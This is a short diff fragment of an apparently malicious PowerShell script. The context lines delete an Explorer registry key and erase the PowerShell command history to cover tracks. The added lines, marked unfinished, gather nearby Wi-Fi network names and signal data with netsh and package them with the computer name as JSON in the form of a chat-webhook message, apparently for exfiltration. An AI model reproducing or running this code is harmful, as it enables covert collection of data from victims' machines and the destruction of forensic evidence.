@@ -215,3 +215,8 @@ reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\
 
 # Delete powershell history
 Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+# Get Neerby Wifi | Not Finish to complete |
+$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
+$Wifi = ($NearbyWifi|Out-String)
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$Wifi"} | ConvertTo-Json
